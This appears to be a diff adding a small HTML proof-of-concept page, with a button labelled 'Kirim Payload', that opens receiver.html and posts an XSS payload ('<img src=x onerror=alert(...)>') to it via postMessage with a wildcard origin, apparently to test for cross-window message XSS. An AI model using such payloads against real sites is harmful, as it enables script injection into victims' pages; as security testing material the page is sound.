@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="send()">Kirim Payload</button>
+
+  <script>
+    function send() {
+      window.open(
+        "receiver.html",
+        "_blank"
+      ).postMessage(
+        "<img src=x onerror=alert('XSS')>",
+        "*"
+      );
+    }
+  </script>
+</body>
+</html>
